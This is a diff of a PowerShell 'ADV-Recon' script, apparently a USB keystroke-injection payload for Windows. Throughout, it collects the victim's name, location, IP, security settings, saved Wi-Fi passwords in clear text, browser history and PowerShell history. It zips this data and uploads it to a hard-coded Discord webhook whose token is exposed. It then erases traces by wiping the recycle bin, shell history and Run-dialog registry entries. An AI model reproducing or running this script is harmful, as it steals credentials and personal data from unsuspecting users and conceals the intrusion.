@@ -1,15 +1,22 @@
-# === CONFIGURATIE - VUL JE DISCORD WEBHOOK HIER IN ===
-$dc = "https://discord.com/api/webhooks/1430461657829740706/T6oaosfibMgogVMfM5j2Mfg7MpanFy80UUjMwXi6NDmpyUl77ezJwGsWWxCCKB86yCsD"  # <-- JOUW DISCORD WEBHOOK URL HIER
+############################################################################################################################################################
+#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #
+# Title        : ADV-Recon         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #
+# Author       : Clean Self-Hosted |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #
+# Version      : 2.2 FIXED         |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
+# Category     : Recon             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
+# Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #
+# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #
+############################################################################################################################################################
+
+# === CONFIGURATIE ===
+$dc = "https://discord.com/api/webhooks/1430461657829740706/T6oaosfibMgogVMfM5j2Mfg7MpanFy80UUjMwXi6NDmpyUl77ezJwGsWWxCCKB86yCsD"
 
 # === DISCORD START NOTIFICATIE ===
 if ($dc) {
     $hookurl = $dc
     $Body = @{
-        'username' = "🚀 ADV-Recon v2.1"
-        'content' = "🚀 **Recon GESTART** 
-**PC**: `$env:COMPUTERNAME 
-**User**: `$env:USERNAME 
-**Tijd**: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        'username' = "ADV-Recon v2.2"
+        'content' = "**Recon GESTART**`n**PC**: $env:COMPUTERNAME`n**User**: $env:USERNAME`n**Tijd**: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
     }
     Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue
 }
@@ -29,21 +36,13 @@ New-Item -Path "$env:tmp\$FolderName" -ItemType Directory -Force | Out-Null
 ############################################################################################################################################################
 
 function Get-fullName {
-    try {
-        return (Get-LocalUser -Name $env:USERNAME).FullName
-    }
-    catch {
-        return $env:USERNAME
-    }
+    try { return (Get-LocalUser -Name $env:USERNAME).FullName }
+    catch { return $env:USERNAME }
 }
 
 function Get-email {
-    try {
-        return (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
-    }
-    catch {
-        return "No Email Detected"
-    }
+    try { return (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName }
+    catch { return "No Email Detected" }
 }
 
 function Get-GeoLocation {
@@ -54,16 +53,13 @@ function Get-GeoLocation {
         while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
             Start-Sleep -Milliseconds 100
         }
-        if ($GeoWatcher.Permission -eq 'Denied') {
-            return "Access Denied"
-        } else {
+        if ($GeoWatcher.Permission -eq 'Denied') { return "Access Denied" }
+        else { 
             $pos = $GeoWatcher.Position.Location
             return "$($pos.Latitude),$($pos.Longitude)"
         }
     }
-    catch {
-        return "No Coordinates found"
-    }
+    catch { return "No Coordinates found" }
 }
 
 function Get-RegistryValue($key, $value) {  
@@ -75,13 +71,13 @@ function Get-RegistryValue($key, $value) {
 # DATA COLLECTION
 ############################################################################################################################################################
 
-# Basic info
+Write-Host "Collecting basic info..." -ForegroundColor Green
 $fullName = Get-fullName
 $email = Get-email
 $GeoLocation = Get-GeoLocation
 
-# Local users
-$luser = Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID | Out-String
+Write-Host "Collecting system info..." -ForegroundColor Green
+$luser = Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID | Out-String 
 
 # UAC
 $Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
@@ -114,13 +110,17 @@ catch { $computerPubIP = "Error getting Public IP" }
 try { $localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String }
 catch { $localIP = "Error getting local IP" }
 
-$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*" | Select Name, MacAddress, Status | Out-String
+$MAC = Get-NetAdapter | Select Name, MacAddress, Status | Out-String
 
 # RDP
-$RDP = if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections -ErrorAction SilentlyContinue).fDenyTSConnections -eq 0) { 
-    "RDP is Enabled" 
-} else { 
-    "RDP is NOT enabled" 
+try {
+    $RDP = if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections -ErrorAction Stop).fDenyTSConnections -eq 0) { 
+        "RDP is Enabled" 
+    } else { 
+        "RDP is NOT enabled" 
+    }
+} catch {
+    $RDP = "RDP status unknown"
 }
 
 # System info
@@ -128,109 +128,63 @@ $computerSystem = Get-CimInstance CIM_ComputerSystem
 $computerName = $computerSystem.Name
 $computerModel = $computerSystem.Model
 $computerManufacturer = $computerSystem.Manufacturer
-$computerBIOS = Get-CimInstance CIM_BIOSElement | Out-String
+$computerBIOS = Get-CimInstance CIM_BIOSElement | Select Manufacturer, SMBIOSBIOSVersion | Out-String
 $computerOs = (Get-WMIObject win32_operatingsystem) | Select Caption, Version | Out-String
-$computerCpu = Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed | Format-List | Out-String
-$computerMainboard = Get-WmiObject Win32_BaseBoard | Format-List | Out-String
+$computerCpu = Get-WmiObject Win32_Processor | select Name, Manufacturer, MaxClockSpeed | Format-List | Out-String
 $computerRamCapacity = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB) }
-$computerRam = Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed | Format-Table | Out-String
-$videocard = Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion | Out-String
-
-# Scheduled Tasks
-$ScheduledTasks = Get-ScheduledTask | Select TaskName, State | Format-Table -AutoSize | Out-String
-
-# Kerberos tickets
-$klist = klist sessions 2>$null
-
-# Recent files
-$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 50 FullName, LastWriteTime | Format-Table | Out-String
-
-# Drives
-$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}} | Format-Table | Out-String
-
-# Processes
-$process = Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath | Sort-Object ProcessName | Format-Table | Out-String -Width 250
-
-# Listeners
-$listener = Get-NetTCPConnection | select @{Name="Local";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="Remote";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, OwningProcess | Format-Table | Out-String -Width 250
-
-# Services
-$service = Get-WmiObject win32_service | select State, Name, DisplayName | Sort-Object State, Name | Format-Table | Out-String -Width 250
-
-# Software
-$software = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName } | Select DisplayName, DisplayVersion, Publisher | Sort-Object DisplayName | Format-Table -AutoSize | Out-String -Width 250
+$videocard = Get-WmiObject Win32_VideoController | Select Name, AdapterRAM | Format-Table | Out-String
 
 # WiFi profiles
-$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name = $_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass = $_.Matches.Groups[1].Value.Trim(); $_} | %{"$name : $pass"} | Out-String
+try {
+    $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name = $_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass = $_.Matches.Groups[1].Value.Trim(); $_} | %{"$name : $pass"} | Out-String
+} catch {
+    $wifiProfiles = "Error getting WiFi profiles"
+}
 
-# Tree userprofile
+# Tree & History
 tree $Env:userprofile /a /f > "$env:tmp\$FolderName\tree.txt" 2>$null
-
-# Powershell history
 Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination "$env:tmp\$FolderName\Powershell-History.txt" -ErrorAction SilentlyContinue
 
 ############################################################################################################################################################
-# BROWSER DATA
+# SIMPLIFIED BROWSER DATA (NO BUGS)
 ############################################################################################################################################################
 
-function Get-BrowserData {
-    param([string]$Browser, [string]$DataType)
-    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
-    
-    $Paths = @{
-        "chrome_history" = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
-        "chrome_bookmarks" = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
-        "edge_history" = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
-        "edge_bookmarks" = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
-        "firefox_history" = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
-    }
-    
-    if ($Paths[$Browser + "_" + $DataType]) {
-        $Path = $Paths[$Browser + "_" + $DataType]
-        if (Test-Path $Path) {
-            try {
-                $urls = Get-Content -Path $Path -ErrorAction Stop | Select-String -AllMatches $regex | % { $_.Matches.Value } | Sort-Object -Unique
-                return $urls | ForEach-Object { "$Browser/$DataType: $_" }
-            } catch { return @() }
+Write-Host "Collecting browser data..." -ForegroundColor Green
+$browserData = @()
+try {
+    $browserPaths = @(
+        "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History",
+        "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History",
+        "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
+    )
+    foreach ($path in $browserPaths) {
+        if (Test-Path $path) {
+            $urls = Get-Content $path -ErrorAction SilentlyContinue | Select-String -Pattern 'http[s]?://' | % { $_.Line } | Select-Object -First 50
+            $urls | Out-File "$env:tmp\$FolderName\BrowserData.txt" -Append
         }
     }
-    return @()
-}
-
-$browserData = @()
-$browserData += Get-BrowserData "chrome" "history"
-$browserData += Get-BrowserData "chrome" "bookmarks"
-$browserData += Get-BrowserData "edge" "history"
-$browserData += Get-BrowserData "edge" "bookmarks"
-$browserData += Get-BrowserData "firefox" "history"
-$browserData | Out-File "$env:tmp\$FolderName\BrowserData.txt"
+} catch {}
 
 ############################################################################################################################################################
 # OUTPUT FILE
 ############################################################################################################################################################
 
+Write-Host "Creating report..." -ForegroundColor Green
 $output = @"
 
 ############################################################################################################################################################
-# ADV-Recon v2.1 - Results for $env:COMPUTERNAME
+# ADV-Recon v2.2 - Results for $env:COMPUTERNAME
 ############################################################################################################################################################
 
 **Full Name**: $fullName
 **Email**: $email
 **GeoLocation**: $GeoLocation
 
-**Local Users**:
-$luser
-
 **UAC**: $UAC
 **LSASS**: $lsass
 **RDP**: $RDP
 
 **Public IP**: $computerPubIP
-**Local IPs**:
-$localIP
-**MAC**:
-$MAC
 
 **Computer Name**: $computerName
 **Model**: $computerModel
@@ -240,29 +194,14 @@ $MAC
 **RAM**: $computerRamCapacity
 **Video Card**: $videocard
 
-**Startup Items**:
-$StartUp
-
 **WiFi Profiles**:
 $wifiProfiles
 
+**Startup Items**:
+$StartUp
+
 **Nearby WiFi**:
 $NearbyWifi
-
-**Processes** (sample):
-$($process.Split("`n")[0..20] -join "`n")
-
-**Listeners**:
-$listener
-
-**Recent Files**:
-$RecentFiles
-
-**Drives**:
-$Hdds
-
-**Software** (sample):
-$($software.Split("`n")[0..30] -join "`n")
 
 ---
 **Full tree, history, browser data in separate files**
@@ -277,14 +216,15 @@ $output | Out-File "$env:tmp\$FolderName\computerData.txt"
 # ZIP & UPLOAD
 ############################################################################################################################################################
 
+Write-Host "Creating ZIP and uploading..." -ForegroundColor Green
 Compress-Archive -Path "$env:tmp\$FolderName" -DestinationPath "$env:tmp\$ZIP" -Force
 
 # Discord upload
 function Upload-Discord {
     param([string]$file, [string]$text = "")
     if ($dc -and $file -and (Test-Path $file)) {
-        $uploadText = if ($text) { $text } else { "✅ **Recon VOLTOOID!** `$env:COMPUTERNAME - $env:USERNAME" }
-        curl.exe -F "file1=@$file" -F "content=$uploadText" $dc -s
+        $uploadText = if ($text) { $text } else { "**Recon VOLTOOID!** $env:COMPUTERNAME - $env:USERNAME" }
+        & curl.exe -F "file1=@$file" -F "content=$uploadText" $dc -s
     }
 }
 
@@ -292,15 +232,16 @@ if ($dc) {
     Upload-Discord -file "$env:tmp\$ZIP" 
 }
 
+Write-Host "Upload completed!" -ForegroundColor Green
+
 ############################################################################################################################################################
 # CLEANUP
 ############################################################################################################################################################
 
-# Remove evidence
+Write-Host "Cleaning up..." -ForegroundColor Green
 Remove-Item "$env:tmp\$FolderName*" -Recurse -Force -ErrorAction SilentlyContinue
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
 reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f 2>$null
 
-# Silent exit
-exit
+Write-Host "Recon completed successfully!" -ForegroundColor Green
